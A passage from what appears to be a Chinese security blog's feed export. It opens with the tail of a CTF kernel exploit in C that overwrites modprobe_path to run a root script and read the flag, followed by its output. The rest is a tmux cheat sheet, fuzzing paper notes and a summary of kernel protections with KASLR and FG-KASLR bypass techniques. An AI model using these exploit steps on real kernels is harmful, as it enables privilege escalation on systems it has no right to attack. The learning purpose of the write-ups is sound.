class="number">0x1111111</span>, &amp;data1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// override modprobe_path to /home/getshell</span></span><br><span class="line">	data1.ptr = &amp;ROOT_SCRIPT_PATH;</span><br><span class="line">	data1.offset = <span class="number">0x10</span>;</span><br><span class="line">	data1.size = <span class="built_in">strlen</span>(ROOT_SCRIPT_PATH);</span><br><span class="line">	ioctl(fd2, <span class="number">0x6666666</span>, &amp;data1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create fake file</span></span><br><span class="line">	<span class="type">int</span> root_script_fd, flag_fd;</span><br><span class="line">	root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">	write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">	close(root_script_fd);</span><br><span class="line">	system(<span class="string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line">	<span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">	flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">	<span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] flag: %s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以获取flag如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home $ /exp</span><br><span class="line">[*]Process binded to core 0</span><br><span class="line">[*]open device1 success</span><br><span class="line">[*]open device2 success</span><br><span class="line">[*] Guess Kernel Heap Base Address: 0xffff8bde80000000</span><br><span class="line">[*] Kernel Base Address: 0xffffffff92e00000</span><br><span class="line">[*] modprobe_path is 0xffffffff94244700</span><br><span class="line">/home/fake: line 1: : not found</span><br><span class="line">[+] flag: rwctf&#123;just_for_test&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>？是否能直接通过读取rootfs的方式来获取flag，因为是磁盘，大概率是可以的，但是远程感觉不一定现实，后面有时间可以试试…</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>template for obsidian</title>
    <url>/posts/f1534c51.html</url>
    <content><![CDATA[<blockquote>
<p>tmux 2.3 及以上</p>
</blockquote>
<p>[<img src="https://image-1252065837.picbj.myqcloud.com/concept_tmux.webp?imageView2/2/w/500" alt="点击查看大图" title="点击查看大图"></p>
<h2 id="一、会话-Sessions"><a href="#一、会话-Sessions" class="headerlink" title="一、会话(Sessions)"></a>一、会话(Sessions)</h2><h3 id="1-1-shell-下操控会话"><a href="#1-1-shell-下操控会话" class="headerlink" title="1.1 shell 下操控会话"></a>1.1 shell 下操控会话</h3><table>
<thead>
<tr>
<th>操作</th>
<th>Shell 命令</th>
</tr>
</thead>
<tbody><tr>
<td>新建会话</td>
<td><code>tmux [new -s 会话名 n 窗口名]</code></td>
</tr>
<tr>
<td>删除会话</td>
<td><code>tmux kill-session -t 会话名</code></td>
</tr>
<tr>
<td>恢复会话</td>
<td><code>tmux at [-t 会话名]</code></td>
</tr>
<tr>
<td>列出所有会话</td>
<td><code>tmux ls</code></td>
</tr>
<tr>
<td>关闭所有会话</td>
<td><code>tmux kill-server</code></td>
</tr>
</tbody></table>
<h3 id="1-2-tmux-中控制会话、切换会话"><a href="#1-2-tmux-中控制会话、切换会话" class="headerlink" title="1.2 tmux 中控制会话、切换会话"></a>1.2 tmux 中控制会话、切换会话</h3><table>
<thead>
<tr>
<th>操作</th>
<th>Tmux 命令</th>
</tr>
</thead>
<tbody><tr>
<td>会话重命名</td>
<td><code>:rename-session [新会话名]</code></td>
</tr>
<tr>
<td>新建会话</td>
<td><code>:new&lt;回车&gt;</code></td>
</tr>
<tr>
<td>离开(detach)当前会话</td>
<td><code>Ctrl+b d</code></td>
</tr>
<tr>
<td>列出所有会话</td>
<td><code>Ctrl+b s</code></td>
</tr>
<tr>
<td>重命名当前会话</td>
<td><code>Ctrl+b $</code></td>
</tr>
<tr>
<td>前往上一个会话</td>
<td><code>Ctrl+b (</code></td>
</tr>
<tr>
<td>前往下一个会话</td>
<td><code>Ctrl+b )</code></td>
</tr>
<tr>
<td><strong>预览会话及其从属的窗口</strong></td>
<td><code>Ctrl+b w</code></td>
</tr>
</tbody></table>
<blockquote>
<p>前置命令(PREFIX CMD)：<code>Ctrl+b</code>，在 Tmux 中，按下 Tmux 前置命令，然后输入相应的指令完成操作，有点类似于 vim 中使用 esc 切换到命令模式。</p>
</blockquote>
<h2 id="二、窗口-Windows"><a href="#二、窗口-Windows" class="headerlink" title="二、窗口(Windows)"></a>二、窗口(Windows)</h2><table>
<thead>
<tr>
<th>操作</th>
<th>Tmux 命令</th>
</tr>
</thead>
<tbody><tr>
<td>创建新窗口</td>
<td><code>Ctrl+b c</code></td>
</tr>
<tr>
<td>后一个窗口</td>
<td><code>Ctrl+b n</code></td>
</tr>
<tr>
<td>前一个窗口</td>
<td><code>Ctrl+b p</code></td>
</tr>
<tr>
<td>根据编号切换窗口</td>
<td><code>Ctrl+b 0..9</code></td>
</tr>
<tr>
<td>切换到最后一个窗口</td>
<td><code>Ctrl+b l</code></td>
</tr>
<tr>
<td>查找窗口</td>
<td><code>Ctrl+b f</code></td>
</tr>
<tr>
<td><strong>重命名当前窗口</strong></td>
<td><code>Ctrl+b ,</code></td>
</tr>
<tr>
<td>关闭当前窗口</td>
<td><code>Ctrl+b &amp;</code></td>
</tr>
</tbody></table>
<p>调整窗口排序</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;br&gt;1&lt;br&gt;2&lt;br&gt;3&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;swap-window -s 3 -t 1  # 交换 3 号和 1 号窗口&lt;br&gt;swap-window -t 1       # 交换当前和 1 号窗口&lt;br&gt;move-window -t 1       # 移动当前窗口到 1 号&lt;br&gt;</code></td>
</tr>
</tbody></table>
<h2 id="三、窗格-面板-分割窗口-Panes"><a href="#三、窗格-面板-分割窗口-Panes" class="headerlink" title="三、窗格&#x2F;面板&#x2F;分割窗口(Panes)"></a>三、窗格&#x2F;面板&#x2F;分割窗口(Panes)</h2><h3 id="3-1-切分、交换"><a href="#3-1-切分、交换" class="headerlink" title="3.1 切分、交换"></a>3.1 切分、交换</h3><table>
<thead>
<tr>
<th>操作</th>
<th>Tmux 命令</th>
</tr>
</thead>
<tbody><tr>
<td>垂直分割</td>
<td><code>Ctrl+b %</code></td>
</tr>
<tr>
<td>水平分割</td>
<td><code>Ctrl+b &quot;</code></td>
</tr>
<tr>
<td>交换窗格</td>
<td><code>Ctrl+b o</code></td>
</tr>
<tr>
<td>关闭窗格</td>
<td><code>Ctrl+b x</code></td>
</tr>
<tr>
<td>左边这个符号代表空格键 - 切换布局</td>
<td><code>Ctrl+b ⍽</code></td>
</tr>
<tr>
<td>显示每个窗格是第几个，当数字出现的时候按数字几就选中第几个窗格</td>
<td><code>Ctrl+b q</code></td>
</tr>
<tr>
<td>与上一个窗格交换位置</td>
<td><code>Ctrl+b &#123;</code></td>
</tr>
<tr>
<td>与下一个窗格交换位置</td>
<td><code>Ctrl+b &#125;</code></td>
</tr>
<tr>
<td>切换窗格最大化&#x2F;最小化</td>
<td><code>Ctrl+b z</code></td>
</tr>
</tbody></table>
<h3 id="3-2-同步窗格"><a href="#3-2-同步窗格" class="headerlink" title="3.2 同步窗格"></a>3.2 同步窗格</h3><p>这么做可以切换到想要的窗口，输入 Tmux 前缀和一个冒号呼出命令提示行，然后输入：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;:setw synchronize-panes&lt;br&gt;</code></td>
</tr>
</tbody></table>
<p>你可以指定开或关，否则重复执行命令会在两者间切换。 这个选项值针对某个窗口有效，不会影响别的会话和窗口。 之后再次执行命令来关闭。</p>
<h3 id="3-3-调整窗格尺寸"><a href="#3-3-调整窗格尺寸" class="headerlink" title="3.3 调整窗格尺寸"></a>3.3 调整窗格尺寸</h3><p>Tmux 支持重调窗格的尺寸，以下几个命令用来调整窗格:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREFIX : resize-pane -D          当前窗格向下扩大 1 格</span><br><span class="line">PREFIX : resize-pane -U          当前窗格向上扩大 1 格</span><br><span class="line">PREFIX : resize-pane -L          当前窗格向左扩大 1 格</span><br><span class="line">PREFIX : resize-pane -R          当前窗格向右扩大 1 格</span><br><span class="line">PREFIX : resize-pane -D 20       当前窗格向下扩大 20 格</span><br><span class="line">PREFIX : resize-pane -t 2 -L 20  编号为 2 的窗格向左扩大 20 格</span><br></pre></td></tr></table></figure>

<h2 id="四、文本模式（文本搜索模式、文本复制模式）"><a href="#四、文本模式（文本搜索模式、文本复制模式）" class="headerlink" title="四、文本模式（文本搜索模式、文本复制模式）"></a>四、文本模式（文本搜索模式、文本复制模式）</h2><p>按下 <code>PREFIX-[</code> 进入文本复制模式。可以使用方向键在屏幕中移动光标。默认情况下，方向键是启用的。在配置文件中启用 Vim 键盘布局来切换窗口、调整窗格大小。Tmux 也支持 Vi 模式。要是想启用 Vi 模式，只需要把下面这一行添加到 .tmux.conf 中：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;setw -g mode-keys vi&lt;br&gt;</code></td>
</tr>
</tbody></table>
<ol>
<li>如果需要搜索文本，进入文本模式后，输入 <code>/</code> 后填入需要搜索的内容，键入 <code>Enter</code> 开始搜索，&#96;n&#x2F;N&#96;&#96; 分别控制下一个&#x2F;上一个</li>
<li>如果需要复制文本，进入文本模式后，正常使用 vi 的选中、复制命令，完成后会车，键入 <code>PREFIX-]</code> 即可完成粘贴</li>
</ol>
<p>注意，Tmux 默认使用的是 emacs 编辑方式。</p>
<p>启用这条配置后，就可以使用 h、j、k、l 来移动光标了。</p>
<p>想要退出文本复制模式的话，按下回车键就可以了。然后按下 <code>PREFIX-]</code> 粘贴刚才复制的文本。</p>
<p>一次移动一格效率低下，在 Vi 模式启用的情况下，可以辅助一些别的快捷键高效工作。</p>
<p>例如，可以使用 w 键逐词移动，使用 b 键逐词回退。使用 f 键加上任意字符跳转到当前行第一次出现该字符的位置，使用 F 键达到相反的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi             emacs        功能</span><br><span class="line">^              M-m          反缩进</span><br><span class="line">Escape         C-g          清除选定内容</span><br><span class="line">Enter          M-w          复制选定内容</span><br><span class="line">j              Down         光标下移</span><br><span class="line">h              Left         光标左移</span><br><span class="line">l              Right        光标右移</span><br><span class="line">L                           光标移到尾行</span><br><span class="line">M              M-r          光标移到中间行</span><br><span class="line">H              M-R          光标移到首行</span><br><span class="line">k              Up           光标上移</span><br><span class="line">d              C-u          删除整行</span><br><span class="line">D              C-k          删除到行末</span><br><span class="line">$              C-e          移到行尾</span><br><span class="line">:              g            前往指定行</span><br><span class="line">C-d            M-Down       向下滚动半屏</span><br><span class="line">C-u            M-Up         向上滚动半屏</span><br><span class="line">C-f            Page down    下一页</span><br><span class="line">w              M-f          下一个词</span><br><span class="line">p              C-y          粘贴</span><br><span class="line">C-b            Page up      上一页</span><br><span class="line">b              M-b          上一个词</span><br><span class="line">q              Escape       退出</span><br><span class="line">C-Down or J    C-Down       向下翻</span><br><span class="line">C-Up or K      C-Up         向下翻</span><br><span class="line">n              n            继续搜索</span><br><span class="line">?              C-r          向前搜索</span><br><span class="line">/              C-s          向后搜索</span><br><span class="line">0              C-a          移到行首</span><br><span class="line">Space          C-Space      开始选中</span><br><span class="line">               C-t          字符调序</span><br></pre></td></tr></table></figure>

<h2 id="五、杂项"><a href="#五、杂项" class="headerlink" title="五、杂项"></a>五、杂项</h2><table>
<thead>
<tr>
<th>描述</th>
<th>cmd</th>
</tr>
</thead>
<tbody><tr>
<td>窗口中央显示一个数字时钟</td>
<td><code>Ctrl+b t</code></td>
</tr>
<tr>
<td>列出所有快捷键</td>
<td><code>Ctrl+b ?</code></td>
</tr>
<tr>
<td>进入命令行模式</td>
<td><code>Ctrl+b :</code></td>
</tr>
</tbody></table>
<h2 id="六、常见问题"><a href="#六、常见问题" class="headerlink" title="六、常见问题"></a>六、常见问题</h2><h3 id="6-1-tmux-窗口自动变更名字"><a href="#6-1-tmux-窗口自动变更名字" class="headerlink" title="6.1 tmux 窗口自动变更名字"></a>6.1 tmux 窗口自动变更名字</h3><ol>
<li>tmux.conf 里面更改</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;br&gt;1&lt;br&gt;2&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;set-window-option -g automatic-rename off&lt;br&gt;set-option -g allow-rename off&lt;br&gt;</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>bashrc 里面更改：</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;br&gt;1&lt;br&gt;</code></td>
<td><code>bash&lt;br&gt;DISABLE_AUTO_TITLE=true&lt;br&gt;</code></td>
</tr>
</tbody></table>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference:"></a>reference:</h2><ol>
<li><a href="https://think.leftshadow.com/docs/tmux/tmux/">Tmux 快捷键 &amp; 速查表 &amp; 简明教程</a></li>
<li><a href="https://tmuxcheatsheet.com/">Tmux Cheat Sheet &amp; Quick Reference</a></li>
<li><a href="https://arcolinux.com/everthing-you-need-to-know-about-tmux-panes/">everthing you need to know about tmux panes</a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>honggfuzz学习笔记</title>
    <url>/posts/6e2e0982.html</url>
    <content><![CDATA[<h2 id="Honggfuzz"><a href="#Honggfuzz" class="headerlink" title="Honggfuzz"></a>Honggfuzz</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul>
<li>多进程-多线程；</li>
<li>pesistent fuzzing mode：fuzz api时，在同一进程中输入新的数据。可以显著提升模糊测试效率</li>
<li>crash track记录完整准确</li>
<li>使用底层（eg：ptrace）接口监视进程状态。可以检测到被劫持、忽视的信号</li>
<li>支持多种基于硬件指令级以及软件层的覆盖率测量方式；同时支持qemu mode的黑盒测试。</li>
<li>persistent fuzzing mode：长期存活的进程重复调用fuzz接口<blockquote>
<p> lets you fuzz your target persistently between two addresses - without forking for every fuzzing attempt.</p>
</blockquote>
</li>
</ul>
<p>TODO：使用</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/google/honggfuzz">honggfuzz</a></li>
</ul>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
  </entry>
  <entry>
    <title>LibAFL论文笔记</title>
    <url>/posts/c9056bfc.html</url>
    <content><![CDATA[<h2 id="论文概述"><a href="#论文概述" class="headerlink" title="论文概述"></a>论文概述</h2><p>本文提出一个新的工具LibAFL，旨在将AFL工具模块化，方便后续各项工作以及改进的集成。</p>
<p>看论文似乎AFL++也提供了高度配置化的模糊测试框架，但是不够通用</p>
<h2 id="拟解决问题"><a href="#拟解决问题" class="headerlink" title="拟解决问题"></a>拟解决问题</h2><ul>
<li>正交性质的工作难以整合集成；</li>
<li>论文个体贡献难以评估：因为无法判断是基于的工具的优势还是创新算法的优势</li>
<li>难以比较不同工作；</li>
</ul>
<h2 id="论文贡献"><a href="#论文贡献" class="headerlink" title="论文贡献"></a>论文贡献</h2><p>提出LibAFL，基于Rust实现的模糊测试框架。LibAFL包含了一系列的库可以用于定制化fuzzer。<br>几个特性：</p>
<ul>
<li>易于扩展；</li>
<li>按现在的fuzzer组成部分划分</li>
<li>Rust编写</li>
<li>实现了大量的模糊测试算法，特性以及插桩选项</li>
</ul>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>关于fuzzing的定义：</p>
<blockquote>
<p>Therefore, we believe it is more appropriate today to think of fuzzing as a family of testing techniques, which repeatedly provide machine-generated inputs to a target system with the aim of finding inputs that satisfy certain objectives.</p>
</blockquote>
<blockquote>
<p>注：灰盒的运行效率可能要优于白盒，因为不会像白盒插桩粒度那么细致</p>
</blockquote>
<h3 id="AFL"><a href="#AFL" class="headerlink" title="AFL++"></a>AFL++</h3><p>吸取了多种针对AFL的改进技术，其作者重新实现了一些改进例如MOpt，AFLFast；并且提供了插件接口（custom mutators），可以自定义变异策略以及测试case minimization。<br>但是没有进行模块化开发</p>
<h2 id="Fuzz-组成部分"><a href="#Fuzz-组成部分" class="headerlink" title="Fuzz 组成部分"></a>Fuzz 组成部分</h2><p>分为9个组成部分</p>
<ul>
<li>Input：几种表现形式，bytearray、AST、token、IR</li>
<li>Corpus：存放硬盘，两种语料库（存放interesting testcases，crash）</li>
<li>Scheduler：获取下一个用于fuzz的testcase的方式。例如FIFO或者随机选择…有的工作会做这方面工作，贡献是解决插桩粒度太细致导致语料库爆炸的问题</li>
<li>Stage：定义对testcase执行的操作。Scheduler选择一个case然后fuzzer每stage执行输入。通常为调用mutator或者analysis stage进行污点分析，或者指minimize corpus size</li>
<li>Observer：从一次执行中获取目标执行信息。eg：coverage map。</li>
<li>Executor：执行目标的方式。</li>
<li>Feedback：将执行结果是否interesting进行分类。例如决定是否输入被加入语料库，以及是否crash</li>
<li>Mutator：对输入进行变异</li>
<li>Generator：生成新Input的部分</li>
</ul>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>核心架构如下：</p>
<img src="/posts/c9056bfc/file-20250905140812805.png" class="">三个核心库：
<ul>
<li>LibAFL Core：主要库，包含模糊测试组成部分以及实现。</li>
<li>LibAFL Targets：包含要与目标程序依存交互的代码，例如coverage tracking</li>
<li>LibAFL CC：提供编译的wrapper</li>
</ul>
<p>Instrumentation Backends：提供了后端执行引擎的API<br>Fuzzer Frontends：所有用于创建fuzzer的库都是前端</p>
<h2 id="应用与实验"><a href="#应用与实验" class="headerlink" title="应用与实验"></a>应用与实验</h2><p>集中于四个方面：roadblocks bypassing, structure-aware fuzzing, corpus scheduling, energy assignment<br>通过三种实验集合来评估：</p>
<ol>
<li>代码覆盖率以及漏洞检测的效果</li>
<li>集成在LibAFL框架的能力</li>
<li>与AFL++ HonggFuzz进行比较</li>
</ol>
<h3 id="Bypassing-Roadblocks"><a href="#Bypassing-Roadblocks" class="headerlink" title="Bypassing Roadblocks"></a>Bypassing Roadblocks</h3><p>通过绕过或者通过复杂的约束条件来提升代码覆盖率。<br>LibAFL提供了多种方法来进行绕过：</p>
<ol>
<li>value-profile：由LibFuzzer提出，通过最大化指令中两个操作数的匹配比特位数。</li>
<li>cmplog：由RedQueen、Weizz使用，通过插桩比较指令以及以指针变量作为参数的函数，并记录运行时相关的值。</li>
<li>autotokens：由AFL++提出，基于LTO pass插桩可以使用，提取比较指令中的tokens以及包含立即数的函数。由于不会引入运行时开销，因此可以作为基线</li>
</ol>
<p>结果：cmplog效果最优，其次是value_profile_cmplog，然后是plain，即baseline，最后是value_profile。原因可能是autotokens方法已经足够优秀，并且value_profile会引入更多的插桩信息，导致可能并不会带来很好的绕过效果。</p>
<h3 id="Structure-aware-Fuzzing"><a href="#Structure-aware-Fuzzing" class="headerlink" title="Structure-aware Fuzzing"></a>Structure-aware Fuzzing</h3><p>令fuzzer基于输入格式进行模糊测试。</p>
<ul>
<li>Nautilus是一个基于语法的覆盖率导向的fuzzer，通过树结构对语料进行建模。变异策略则是子树生成以及替换。</li>
<li>Gramatron：基于语法的fuzzer。</li>
<li>语法学习：Grimoire，基于输入生成树状输入，并进行语法的变异，针对JavaScript的</li>
</ul>
<h3 id="Corpus-Scheduling"><a href="#Corpus-Scheduling" class="headerlink" title="Corpus Scheduling"></a>Corpus Scheduling</h3><ul>
<li>FIFO&#x2F;Random</li>
<li>AFL的权重计算公式</li>
<li>AFL++的基于概率统计的采样方法</li>
<li>TortoiseFuzz的基于三种安全影响度量方式，内存操作，函数粒度，循环</li>
</ul>
<p>结果：AFL++的结果最好，AFL次之，TortoiseFuzz，然后随机的基线策略其实效果也很不错</p>
<h3 id="Energy-Assignment"><a href="#Energy-Assignment" class="headerlink" title="Energy Assignment"></a>Energy Assignment</h3><p>该部分负责一个输入需要被变异多少次来生成新的testcases</p>
<ul>
<li>固定值，或者随机值</li>
<li>AFLFast提供了6种算法：exploit（基于执行时间、覆盖率等标准给予power），explore（降低exploit给定的power），coe（指定0，直到触发边变为低频），fast（基于高频边来指定），lin（基于时间线性变化），quad（二次函数变化）<br>结果：explore &gt; fast &gt; plain &gt; coe</li>
</ul>
<h3 id="A-Generic-Bit-level-Fuzzer"><a href="#A-Generic-Bit-level-Fuzzer" class="headerlink" title="A Generic Bit-level Fuzzer"></a>A Generic Bit-level Fuzzer</h3><p>与其他工具（LibFuzzer, AFL++, HonggFuzz）的比较<br>结果：LibAFL &gt; HonggFuzz &gt; AFL++ &gt; Entropic（LibFuzzer）</p>
<h3 id="Differential-Fuzzing"><a href="#Differential-Fuzzing" class="headerlink" title="Differential Fuzzing"></a>Differential Fuzzing</h3><p>似乎是对以太坊的，先暂时不涉及</p>
<h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><p>仍然缺少一些对象的实现部分，eg: directed fuzzing approaches<br>集成了静态分析API，SYMCC，SYMQEMU</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>Kernel PWN保护机制总结</title>
    <url>/posts/993c4afb.html</url>
    <content><![CDATA[<h2 id="QEMU上可以开的保护及各种绕过方法"><a href="#QEMU上可以开的保护及各种绕过方法" class="headerlink" title="QEMU上可以开的保护及各种绕过方法"></a>QEMU上可以开的保护及各种绕过方法</h2><h3 id="KASLR-CONFIG-RANDOMIZE-BASE"><a href="#KASLR-CONFIG-RANDOMIZE-BASE" class="headerlink" title="KASLR (CONFIG_RANDOMIZE_BASE)"></a>KASLR (CONFIG_RANDOMIZE_BASE)</h3><p>KASLR(Kernel Address Space Layout Randomize, 内核地址空间布局随机化)，开启后，允许<code>kernel image</code>加载到<code>VMALLOC</code>区域的任何位置。在未开启KASLR保护机制时，内核代码段的基址为 <code>0xffffffff81000000</code>，<code>direct mapping area</code> 的基址为 <code>0xffff888000000000</code>。</p>
<h4 id="查看方法"><a href="#查看方法" class="headerlink" title="查看方法"></a>查看方法</h4><ul>
<li>内核启动参数是否包含kaslr参数；</li>
<li>读&#x2F;proc&#x2F;kallsyms，查看是否对应未开启KASLR的基址，或者多开几次看地址是否相同。</li>
</ul>
<h4 id="绕过1"><a href="#绕过1" class="headerlink" title="绕过1"></a>绕过1</h4><p>通过利用漏洞实现任意地址读，泄漏page_offset_base；<br><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x07-Kernel-Heap-Arbitrary-Address-Allocation">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x07-Kernel-Heap-Arbitrary-Address-Allocation</a></p>
<ul>
<li>常见结构体泄漏：msg_msg</li>
<li>在 0x9d000 处泄漏内核地址</li>
<li>copy_to_user 爆破：通过结构体利用任意读时，如果设置地址是无效地址，copy_to_user 会返回非0值，此时 read_ldt （以 ldt_struct 为例）返回值是 -EFAULT，当 read_ldt 执行成功，说明命中内核空间。</li>
</ul>
<h4 id="绕过2"><a href="#绕过2" class="headerlink" title="绕过2"></a><del>绕过2</del></h4><p><del>通过Kernel Oops的打印信息中包含的地址来泄漏，（没有开oops&#x3D;panic）</del></p>
<h4 id="绕过3"><a href="#绕过3" class="headerlink" title="绕过3"></a><del>绕过3</del></h4><p><del>读&#x2F;proc&#x2F;kallsyms</del></p>
<h3 id="FG-KASLR-CONFIG-FG-KASLR-CONFIG-MODULE-FG-KASLR"><a href="#FG-KASLR-CONFIG-FG-KASLR-CONFIG-MODULE-FG-KASLR" class="headerlink" title="FG-KASLR (CONFIG_FG_KASLR &amp; CONFIG_MODULE_FG_KASLR)"></a>FG-KASLR (CONFIG_FG_KASLR &amp; CONFIG_MODULE_FG_KASLR)</h3><p>Function Granular Kernel Address Space Layout Randomization细粒度的 <code>kaslr</code>，函数级别上的 <code>KASLR</code> 优化。该保护只是在代码段打乱顺序，在数据段偏移不变，例如 <code>commit_creds</code> 函数的偏移改变但是 <code>init_cred</code> 的偏移不变。<br><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/##">https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/##</a> </p>
<h4 id="查看方法-1"><a href="#查看方法-1" class="headerlink" title="查看方法"></a>查看方法</h4><p>读&#x2F;proc&#x2F;kallsyms，符号顺序是随机的</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>根据 FGKASLR 的特点，我们可以发现它具有以下缺陷</p>
<ul>
<li>函数粒度随机化，如果函数内的某个地址知道了，函数内部的相对地址也就知道了。</li>
<li><code>.text</code> 节区不参与函数随机化。因此，一旦知道其中的某个地址，就可以获取该节区所有的地址。有意思的是系统调用的入口代码都在该节区内，主要是因为这些代码都是汇编代码。此外，该节区具有以下一些不错的 gadget<ul>
<li>swapgs_restore_regs_and_return_to_usermode，该部分的代码可以帮助我们绕过 KPTI 防护</li>
<li>memcpy 内存拷贝</li>
<li>sync_regs，可以把 RAX 放到 RDI 中</li>
</ul>
</li>
<li><code>__ksymtab</code> 相对于内核镜像的偏移是固定的。因此，如果我们可以泄露数据，那就可以泄露出其它的符号地址，如 prepare_kernel_cred、commit_creds。具体方式如下<ul>
<li>基于内核镜像地址获取 __ksymtab 地址</li>
<li>基于 __ksymtab 获取对应符号记录项的地址</li>
<li>根据符号记录项中具体的内容来获取对应符号的地址</li>
</ul>
</li>
<li><code>data</code> 节区相对于内核镜像的偏移也是固定的。因此在获取了内核镜像的基地址后，就可以计算出数据区数据的地址。这个节区有一些可以重点关注的数据<ul>
<li>modprobe_path</li>
</ul>
</li>
</ul>
<h5 id="ksymtab-格式-¶"><a href="#ksymtab-格式-¶" class="headerlink" title="__ksymtab 格式 ¶"></a>__ksymtab 格式 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#__ksymtab" title="Permanent link">¶</a></h5><p>__ksymtab 中每个记录项的名字的格式为 <code>__ksymtab_func_name</code>，以 <code>prepare_kernel_cred</code> 为例，对应的记录项的名字为<code>__ksymtab_prepare_kernel_cred</code>，因此，我们可以直接通过该名字在 IDA 里找到对应的位置，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF81F8D4FC __ksymtab_prepare_kernel_cred dd 0FF5392F4h </span><br><span class="line">__ksymtab:FFFFFFFF81F8D500                 dd 134B2h </span><br><span class="line">__ksymtab:FFFFFFFF81F8D504                 dd 1783Eh</span><br></pre></td></tr></table></figure>

<p><code>__ksymtab</code> 每一项的结构为x</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> value_offset;</span><br><span class="line">	<span class="type">int</span> name_offset;</span><br><span class="line">	<span class="type">int</span> namespace_offset; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>第一个表项记录了重定位表项相对于当前地址的偏移。那么，<code>prepare_kernel_cred</code> 的地址应该为 <code>0xFFFFFFFF81F8D4FC-(2**32-0xFF5392F4)=0xffffffff814c67f0</code>。实际上也确实如此。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0                 public prepare_kernel_cred </span><br><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0 prepare_kernel_cred proc near           ; CODE XREF: sub_FFFFFFFF814A5ED5+52↑p</span><br></pre></td></tr></table></figure>


<p>例题：<a href="https://www.freebuf.com/articles/network/371484.html">Kernel-Pwn-FGKASLR保护绕过</a></p>
<h3 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP&#x2F;SMAP"></a>SMEP&#x2F;SMAP</h3><p>SMEP(Supervisor Mode Execution Prevention), SMAP(Supervisor Mode Accession Prevention)</p>
<h4 id="查看方法-2"><a href="#查看方法-2" class="headerlink" title="查看方法"></a>查看方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep smep /proc/cpuinfo</span><br><span class="line">grep smap /proc/cpuinfo</span><br></pre></td></tr></table></figure>

